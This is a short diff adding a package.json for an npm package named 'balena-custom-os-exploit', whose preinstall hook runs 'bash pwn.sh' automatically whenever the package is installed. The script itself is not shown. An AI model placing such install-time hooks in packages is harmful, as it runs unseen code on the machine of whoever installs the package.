@@ -1,0 +1,8 @@
+{
+  "name": "balena-custom-os-exploit",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "bash pwn.sh",
+    "test": "echo 'no tests'"
+  }
+}
